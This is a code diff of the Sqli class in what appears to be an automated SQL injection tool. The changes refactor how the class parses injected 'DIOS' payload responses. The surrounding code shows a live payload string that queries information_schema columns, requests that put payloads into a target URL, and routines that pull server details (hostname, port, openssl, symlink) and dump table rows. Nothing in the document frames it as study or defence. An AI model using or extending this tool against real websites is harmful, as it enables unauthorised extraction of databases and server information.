@@ -13,8 +13,10 @@ class Sqli:
       self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
       self.result = ''
 
-    def get_result(self,plaintext):
-        sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",plaintext)
+    def get_result(self,body):
+        body = body.replace("\n", "\r")
+        sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",body)
+
         if ( sqli_helper ):
             return sqli_helper.group(1)
         else:
@@ -29,11 +31,9 @@ class Sqli:
     def information(self, level=1):
         dios = Dios().get_information()
         response = requests.get(self.url.replace('*',dios))
-
         if level == 1:
-            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text)
-            if ( sqli_helper ):
-                sqli_helper = sqli_helper.group(1)
+            try:
+                sqli_helper = self.get_result(response.text)
 
                 hostname        = re.search("<hostname\(\)>(.*)</hostname\(\)>", sqli_helper)
                 port            = re.search("<port\(\)>(.*)</port\(\)>", sqli_helper)
@@ -62,13 +62,8 @@ class Sqli:
                 openssl         = openssl.group(1)          if bool(openssl)            else "can't get information"
                 symlink         = symlink.group(1)          if bool(symlink)            else "can't get information"
                 socket          = socket.group(1)           if bool(socket)             else "can't get information"
-
-                
-            else:
-                return {
-                    "status": False,
-                    "message": "Response sql injectin do not match"
-                }
+            except Exception as identifier:
+                raise Exception(identifier)
 
         return {
                     "hostname": hostname,
@@ -91,23 +86,24 @@ class Sqli:
             query           = Dios().dump_data(tables, columns, database)
             query_builder   = Dios().build(query)
             response        = requests.get(self.url.replace('*',query_builder))
-            try:
-                result          = self.get_result(response.text)
-                sqli_array      = result.split('<end/>,')
+            # try:
+            result          = self.get_result(response.text)
+            
+            sqli_array      = result.split('<end/>,')
 
-                realResult              = dict()
-                realResult['columns']   = columns
-                realResult['data']      = list()
-                for sqli in sqli_array:
-                    self.result = sqli
-                    result      = dict()
+            realResult              = dict()
+            realResult['columns']   = columns
+            realResult['data']      = list()
+            for sqli in sqli_array:
+                self.result = sqli
+                result      = dict()
 
-                    for column in columns:
-                        result[column] = self.getResultByTag(column)
-                    realResult['data'].append(result)
-                return realResult
-            except Exception as identifier:
-                return identifier
+                for column in columns:
+                    result[column] = self.getResultByTag(column)
+                realResult['data'].append(result)
+            return realResult
+            # except Exception as identifier:
+            #     return identifier
 
     def command_line(self):
         user   = Dios().build(Dios().user())
